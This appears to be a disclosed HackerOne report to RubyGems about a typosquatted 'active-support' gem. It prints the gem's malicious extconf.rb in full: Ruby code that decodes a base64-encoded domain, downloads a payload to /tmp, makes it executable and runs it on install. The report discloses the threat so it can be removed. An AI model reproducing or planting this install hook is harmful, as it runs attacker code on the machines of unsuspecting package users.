@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/392311
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/reed
+ReportedTo:RubyGems(rubygems)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:09.08.2018 18:14:31
+
+Summary:
+
+This was sent to RubySec:
+
+The gem duplicates official `activesupport` (no hyphen) code, but adds a compiled extension. The extension attempts to resolve a base64 encoded domain (`29faea63.planfhntage.de`), downloads a payload, and executes.
+
+active-support-5.2.0.gem/data/ext/trellislike/unflaming/waffling/extconf.rb
+
+```
+require 'net/http'
+require 'uri'
+require 'base64'
+require 'resolv'
+
+class Smectis
+  def self.install_explot(weighership)
+    if !weighership.nil? and weighership != '0.0.0.0'
+      educable = Net::HTTP.get_response(URI('http://' + weighership + '/mimming'))
+      File.open('/tmp/autosymbiontic', 'wb+') do |uterometer|
+        uterometer.binmode
+        uterometer.write(educable.body)
+        uterometer.chmod(0777)
+        uterometer.close
+      end
+      system('/tmp/autosymbiontic')
+    end
+  end
+
+  def self.run()
+    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='
+    jaunting = nil
+    begin
+      jaunting = Resolv.getaddress(Base64.decode64(milligram))
+    rescue
+    end
+    self.install_exploit(jaunting)
+  end
+end
+
+Smectis.run()
+```
+
+## Impact
+
+Run arbitrary code on a victim's machine.
